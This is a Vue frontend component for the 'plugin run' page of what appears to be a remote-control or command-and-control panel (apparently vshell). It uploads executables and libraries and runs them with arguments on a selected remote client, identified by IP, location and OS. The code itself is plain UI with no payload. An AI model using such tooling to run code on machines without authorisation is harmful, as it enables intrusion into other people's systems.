<script setup lang="ts">
// 插件运行：按 4.9.3 的布局——顶部「上传插件 / 运行」，表单为 客户端 / 选择插件 / 参数
import { computed, onMounted, ref } from 'vue'
import { useRoute } from 'vue-router'
import { message } from 'ant-design-vue'
import { get, post } from '../api/http'

const route = useRoute()
const routeId = Number(route.params.id) || 0
// 4.9.3 的插件页有两种入口：带客户端 id（只读展示）或不带（页内选择）
const pickedId = ref<number>(routeId)
const id = computed(() => pickedId.value)
const plugins = ref<{ id: number; name: string }[]>([])
const pluginName = ref<string>()
const procArg = ref('')
const output = ref('')
const loading = ref(false)
const clients = ref<any[]>([])

const clientLabel = computed(() => {
  const c = clients.value.find((x) => x.Id === id.value)
  if (!c) return `ID: ${id.value}`
  return `ID: ${id} ${c.Remark || ''} IP: ${c.Addr || ''} Location: ${c.Location || ''} OS: ${c.OsName || ''}`
})

async function load() {
  const [r, c]: any[] = await Promise.all([
    get('/runner/list'),
    post('/client/list', { page: 1, pageSize: 200 }),
  ])
  plugins.value = r?.result || []
  clients.value = c?.result?.items || []
}
onMounted(load)

async function run() {
  try { await formRef.value?.validate() } catch { return }
  loading.value = true
  output.value = ''
  try {
    const res: any = await post('/runner/runplugin', { id: id.value, pluginName: pluginName.value, procArg: procArg.value })
    output.value = res?.result?.output ?? JSON.stringify(res, null, 2)
  } catch (e: any) {
    output.value = e?.message || String(e)
  } finally { loading.value = false }
}

// 上传插件：4.9.3 接受 exe/net/elf/dll/so/dylib，最多 6 个
async function onUpload(e: Event) {
  const files = (e.target as HTMLInputElement).files
  if (!files?.length) return
  const token = localStorage.getItem('vshell.token') || ''
  for (const f of Array.from(files).slice(0, 6)) {
    const fd = new FormData()
    fd.append('file', f)
    const resp = await fetch('/api/runner/upload', { method: 'POST', body: fd, headers: { Token: token } })
    const data = await resp.json()
    if (data.code === 0) message.success(`上传成功：${f.name}`)
    else message.error(`${f.name} 上传失败：${data.message || ''}`)
  }
  ;(e.target as HTMLInputElement).value = ''
  load()
}

async function copyOut() {
  if (!output.value) { message.warning('没有可复制的内容'); return }
  try { await navigator.clipboard.writeText(output.value); message.success('已复制') }
  catch { message.warning('复制失败，请手动选择') }
}

const uploadRef = ref<HTMLInputElement>()
const formRef = ref<any>(null)
</script>

<template>
  <a-card :bordered="false" title="插件运行">
    <a-space style="margin-bottom: 12px">
      <a-button type="primary" @click="uploadRef?.click()">上传插件</a-button>
      <input ref="uploadRef" type="file" multiple style="display:none"
        accept=".exe,.net,.elf,.dll,.so,.dylib" @change="onUpload" />
      <a-button type="primary" :loading="loading" @click="run">运行</a-button>
    </a-space>

    <a-form ref="formRef" :model="{ pluginName }" :label-col="{ style: 'width: 100px' }" :wrapper-col="{ span: 14 }">
      <a-form-item label="客户端">
        <a-input v-if="routeId" :value="clientLabel" readonly />
        <a-select v-else v-model:value="pickedId" placeholder="选择客户端">
          <a-select-option v-for="c in clients" :key="c.Id" :value="c.Id">
            ID: {{ c.Id }} {{ c.Remark || '' }} IP: {{ c.Addr }} Location: {{ c.Location || '-' }} OS: {{ c.OsName }}
          </a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="选择插件" name="pluginName" :rules="[{ required: true, message: '请选择插件' }]">
        <a-select v-model:value="pluginName" placeholder="选择 plugins/ 下的插件">
          <a-select-option v-for="p in plugins" :key="p.name" :value="p.name">{{ p.name }}</a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="参数">
        <a-input v-model:value="procArg" placeholder="可选" />
      </a-form-item>
    </a-form>

    <a-card size="small" title="输出" style="margin-top: 8px">
      <template #extra>
        <a-space>
          <a-button size="small" @click="copyOut">复制</a-button>
          <a-button size="small" @click="output = ''">清空</a-button>
        </a-space>
      </template>
      <pre class="out">{{ output || '（无输出）' }}</pre>
    </a-card>
  </a-card>
</template>

<style scoped>
.out { min-height: 240px; margin: 0; white-space: pre-wrap; font-family: ui-monospace, monospace; font-size: 12px; }
</style>
